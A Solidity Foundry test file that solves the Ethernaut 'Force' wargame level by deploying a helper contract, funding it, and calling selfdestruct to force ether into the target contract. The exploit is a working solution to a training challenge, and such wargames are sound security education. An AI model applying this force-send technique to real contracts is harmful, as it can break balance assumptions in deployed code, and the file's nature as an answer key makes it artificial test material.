// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Force.sol";
import "src/levels/ForceFactory.sol";

contract TestForce is BaseTest {
    Force private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ForceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Force(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(address(player));

        MigrateFunds sample = new MigrateFunds();
        address(sample).transfer(1 ether);
        sample.migrateFundsToContract(address(level));
        
        vm.stopPrank();
    }
}

contract MigrateFunds {
    event Log(string, uint256);

    function migrateFundsToContract(address recipient) external {
        selfdestruct(payable(recipient));
    }

    fallback() external payable {
        // send / transfer (forwards 2300 gas to this fallback function)
        // call (forwards all of the gas)
        emit Log("fallback", gasleft());
    }
}
